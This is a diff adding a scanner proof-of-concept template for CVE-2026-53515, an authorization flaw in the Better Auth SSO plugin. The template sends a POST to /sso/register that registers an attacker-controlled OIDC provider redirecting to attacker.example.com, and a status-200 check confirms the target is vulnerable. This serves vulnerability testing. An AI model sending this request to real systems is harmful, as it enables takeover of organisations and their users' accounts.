@@ -1,0 +1,31 @@
+[info]
+author = "ave"
+description = "验证 Better Auth @better-auth/sso 插件在 POST /sso/register 端点未校验调用者管理员权限，任意组织成员可注册恶意 OIDC/SAML 提供者并接管组织"
+id = "POC-AVE-2026-0405"
+name = "CVE-2026-53515 PoC"
+severity = "high"
+tags = ["ave-2026-0405"]
+vuln_id = [
+    "CVE-2026-53515",
+    "AVE-2026-0405",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/sso/register"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"providerId":"attacker-oidc","providerType":"oidc","clientId":"evil-client","clientSecret":"evil-secret","redirectUri":"https://attacker.example.com/callback"}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
